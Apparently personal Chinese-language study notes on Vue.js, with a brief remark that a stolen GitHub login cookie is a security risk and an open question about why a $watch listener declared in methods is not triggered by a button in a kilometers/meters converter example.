**![image-20220114105842779](https://raw.githubusercontent.com/Francis-cell/Picture/main/202201141058990.png)**

这里的Cookie在Github初次登陆的时候就会给浏览器返回，作为用户的身份标识，如果这个信息被盗用，则会引发安全问题（XSS攻击）





### Q&A

#### 1、问题类（尚不能解答）

##### 1、==methods下声明的listener，不能被button点击正常调用==

###### 1、问题详情

具体代码如下：

```html
<div id="app1">
    千米： <input type="text" v-model = "kilometers">
    米： <input type="text" v-model = "meters">
    <!-- <button v-on:click="fun1">提交</button> -->
</div>
<p id="info"></p>

<script>
    var vm1 = new Vue({
        el: '#app1',
        data: {
            kilometers: 0,
            meters: 0
        },
        methods: {

            // 思考：为什么不能在这里声明成一个方法，并在点击button按钮后将其触发
            // fun1 : function() {
            // 	// $watch 是一个实例方法
            // 	vm1.$watch('kilometers', function (newValue, oldValue) {
            // 		// 这个回调将在 vm1.kilometers 改变后调用
            // 		document.getElementById('info').innerHTML = "kilometers的值在修改为： " + oldValue + " 修改后为： " + newValue;
            // 	})
            // }
        },
        computed: {
        },
        watch: {
            kilometers : function(val) {
                this.kilometers = val;
                this.meters = this.kilometers * 1000;
            },
            meters : function(val) {
                this.meters = val;
                this.kilometers = val / 1000;
            }
        }
    });

    // $watch 是一个实例方法
    vm1.$watch('kilometers', function (newValue, oldValue) {
        // 这个回调将在 vm1.kilometers 改变后调用
        document.getElementById('info').innerHTML = "kilometers的值在修改为： " + oldValue + " 修改后为： " + newValue;
    })
</script>
```



#### 2、问题类（已解答）









